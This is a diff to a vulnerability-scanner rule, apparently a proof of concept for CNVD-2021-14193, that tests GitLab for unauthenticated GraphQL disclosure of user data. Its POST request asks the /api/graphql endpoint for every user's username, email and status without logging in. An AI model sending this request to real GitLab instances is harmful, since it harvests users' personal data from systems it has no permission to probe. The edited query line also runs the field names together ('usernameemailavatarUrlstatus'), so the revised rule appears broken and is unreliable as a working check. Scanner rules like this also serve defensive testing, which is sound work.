@@ -3,7 +3,7 @@ rules:
   - method: GET
     path: "/users/sign_in"
     follow_redirects: false
-    expression: 
+    expression:
       response.body.bcontains(bytes(string("gitlab"))) && response.status == 200
   - method: POST
     path: "/api/graphql"
@@ -11,9 +11,9 @@ rules:
       Content-Type: application/json
     follow_redirects: false
     body: |
-      {"query":"{users {edges {  node {    username    email    avatarUrl    status {      emoji      message      messageHtml     }    }   }  } }","variables":null,"operationName":null}
-    expression: 
-      response.status == 200 && response.body.bcontains(b"users") && response.body.bcontains(b"email") && response.body.bcontains(b"username") 
+      {"query":"{users{edges{node{usernameemailavatarUrlstatus{emojimessagemessageHtml}}}}}","variables":null,"operationName":null}
+    expression:
+      response.status == 200 && response.body.bcontains(b"users") && response.body.bcontains(b"email") && response.body.bcontains(b"username")
 detail:
   author: tangshoupu
   info: GitLab_api.graphql-cnvd-2021-14193-unauth
